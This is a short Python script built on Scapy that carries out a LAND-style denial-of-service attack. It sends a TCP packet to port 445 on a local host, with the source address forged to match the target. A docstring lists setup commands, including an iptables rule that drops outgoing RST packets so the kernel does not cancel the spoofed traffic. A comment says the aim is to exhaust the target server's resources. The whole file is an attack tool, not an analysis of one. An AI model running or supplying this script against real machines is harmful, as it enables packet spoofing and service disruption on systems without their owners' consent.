#!/usr/bin/env python3
from scapy.all import *
import binascii

"""Commands for SYN/ACK during Scapy:

Lengthen TCP Timeout to 10 mins:
	echo 10 > /proc/sys/net/ipv4/tcp_synack_retries

Block RST packets (Otherwise Kernel will consider scapy packets as unauthorized and prevent them from transmitting):
	iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
tcpdump -nX port 445"""

#Affects the RAM usage of the target server by wasting time sending SYN/ACK packets to itself

conf.L3socket
conf.L3socket = L3RawSocket

i = IP(dst = "192.168.0.107",src = "192.168.0.107")

for p in range(1000,1001):
	t = TCP(dport = 445, sport = p)

	r = send(i/t)

